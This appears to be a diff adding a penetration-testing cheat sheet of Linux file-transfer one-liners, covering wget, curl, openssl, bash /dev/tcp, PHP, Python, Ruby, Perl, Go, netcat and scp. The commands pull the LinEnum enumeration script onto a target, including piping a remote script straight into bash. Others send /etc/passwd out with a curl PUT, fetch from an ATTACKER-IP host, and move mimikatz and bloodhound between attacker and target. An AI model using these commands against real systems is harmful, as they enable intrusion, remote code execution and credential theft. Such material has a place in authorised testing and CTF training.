@@ -1,0 +1,137 @@
+LINUX
+===============================================================================================================================
+
+WGET/cURL (Download)
+
+$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+cURL (Upload) / PUT request
+
+# curl -T /etc/passwd http://localhost:PORT/SecretUploadDirectory/users.txt
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+OPENSSL (send files "nc style")
+
+-> Server (create certificate):
+$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+
+-> Server (start local server):
+$ openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+-> Client (download file):
+$ openssl s_client -connect SERVER-IP:PORT -quiet > LinEnum.sh
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+BASH (dev/tcp)
+
+-> Connect to server:
+$ exec 3<>/dev/tcp/SERVER-IP/PORT
+
+-> HTTP GET request:
+$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+-> Print response:
+$ cat <&3
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+PHP (sudo apt install php7.4-cli)
+
+-> File_get_contents():
+$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+-> Fopen():
+$ php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+-> Php-curl:
+$ php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
+
+-> Php-curl (retrieve each line as array & output directly to bash - in memory):
+$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+PYTHON
+
+-> Python2:
+import urllib
+urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
+
+->Python3
+import urllib.request
+urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+RUBY
+
+$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+PERL
+
+$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+GO
+
+package main
+
+import (
+	 "os"
+     "io"
+     "net/http"
+)
+
+func main() {
+     lfile, err := os.Create("LinEnum.sh")
+     _ = err
+     defer lfile.Close()
+
+     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+     response, err := http.Get(rfile)
+     defer response.Body.Close()
+
+     io.Copy(lfile, response.Body)
+}
+
+-> Execute the script:
+go run main.go
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+NETCAT
+
+-> Connection initiated by Attacker:
+
+1. target@target:~$ nc -nlvp 8000 > mimikatz.exe
+2. attacker@attacker:~$ nc -nv 10.10.10.132 8000 <mimikatz.exe
+
+-> Connection initiated by Target:
+
+1. attacker@attacker:~$ nc -nv 10.10.10.32 8000 > mimikatz.exe
+2. target@target:~$ nc -nlvp 8000 < mimikatz.exe
+
+
+==> Start Netcat listener:
+$ nc -lvnp 80 < LinEnum.sh
+
+==> Download file
+$ cat < /dev/tcp/ATTACKER-IP/PORT > LinEnum.sh
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+SCP (Windows & Linux)
+
+-> Upload:
+PS C:\User> scp C:\Temp\bloodhound.zip user@TARGET-IP:/tmp/bloodhound.zip
+
+-> Download:
+$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
